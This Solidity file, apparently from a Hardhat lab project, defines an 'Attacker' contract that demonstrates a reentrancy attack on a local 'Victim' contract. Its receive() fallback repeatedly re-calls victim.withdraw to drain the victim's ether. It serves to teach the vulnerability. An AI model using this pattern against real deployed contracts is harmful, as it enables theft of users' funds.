// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Victim.sol";
// Uncomment this line to use console.log
import "hardhat/console.sol";

contract Attacker {
    Victim victim;

    // 构造函数，指定受害合约地址
    constructor(address victimAddress) {
        victim = Victim(victimAddress);
    }

    function deposit() public payable {
        require(msg.value == 1 ether, "Need exactly 1 ether");
        console.log("Attacker balance before deposit: ", address(this).balance);
        victim.deposit{value: msg.value}();
        console.log("Attacker balance after deposit: ", address(this).balance);
    }

    // 攻击函数：向受害合约发送ETH，并执行重入攻击
    function withdraw() external payable{
        // 调用提现函数，触发重入
        victim.withdraw(1 ether);
        console.log("Attacker entering victim contract to withdraw");
    }

    // 接受ETH并在收到时触发攻击
    receive() external payable {
        // 重入攻击：再次调用withdraw
//      console.log("Attacker Received ETH during reentrancy attack. Current attacker balance: ", address(this).balance);
        if(address(victim).balance >= 1 ether) {
//          console.log("Attacker Re-entering victim contract to withdraw again.");
            victim.withdraw(1 ether);
        }
    }
}